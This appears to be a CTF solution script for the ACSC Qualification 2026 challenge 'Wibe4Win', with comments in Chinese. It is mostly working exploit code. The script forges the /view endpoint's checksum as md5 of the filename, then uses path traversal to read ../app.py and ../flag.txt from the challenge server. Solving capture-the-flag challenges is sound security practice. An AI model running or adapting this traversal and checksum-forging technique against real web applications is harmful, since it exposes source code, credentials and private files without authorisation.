#!/usr/bin/env python3
"""
ACSC Qualification 2026 - Wibe4Win

利用步骤：
1. 拉取首页并验证 snippet 链接中的 checksum 实际上就是 md5(file)
2. 利用 /view 的路径拼接问题读取 ../app.py
3. 读取 ../flag.txt 并提取 dach2026{...}

脚本只使用 Python 标准库。
"""

from __future__ import annotations

import argparse
import hashlib
import re
import sys
import urllib.parse
import urllib.request


DEFAULT_BASE = "https://be0s8cwbxaasof6s.dyn.acsc.land"


def fetch_text(url: str) -> str:
    with urllib.request.urlopen(url, timeout=15) as response:
        return response.read().decode("utf-8", errors="replace")


def read_via_view(base: str, filename: str) -> str:
    checksum = hashlib.md5(filename.encode()).hexdigest()
    url = f"{base}/view?file={urllib.parse.quote(filename, safe='/.')}&checksum={checksum}"
    return fetch_text(url)


def verify_homepage_checksums(base: str) -> None:
    html = fetch_text(f"{base}/")
    matches = re.findall(r"/view\?file=([^&]+)&checksum=([0-9a-f]{32})", html)
    if not matches:
        raise RuntimeError("首页中没有找到任何 snippet 链接")

    for raw_name, checksum in matches:
        name = urllib.parse.unquote(raw_name)
        expected = hashlib.md5(name.encode()).hexdigest()
        if checksum != expected:
            raise RuntimeError(f"snippet checksum mismatch: {name}")
    print(f"[+] verified {len(matches)} homepage snippet checksums")


def extract_flag(text: str) -> str:
    match = re.search(r"dach2026\{[^}]+\}", text)
    if not match:
        raise RuntimeError("未能在响应中提取 flag")
    return match.group(0)


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit ACSC Qualification 2026 Wibe4Win")
    parser.add_argument("--base", default=DEFAULT_BASE, help="目标 URL，例如 https://host")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    print(f"[+] target: {base}")

    verify_homepage_checksums(base)

    app_source = read_via_view(base, "../app.py")
    if "SNIPPETS_DIR" not in app_source or "flag.txt" not in app_source:
        raise RuntimeError("读取 ../app.py 失败，未找到预期源码特征")
    print("[+] ../app.py read succeeded")

    flag_text = read_via_view(base, "../flag.txt")
    flag = extract_flag(flag_text)
    print("[+] ../flag.txt read succeeded")
    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
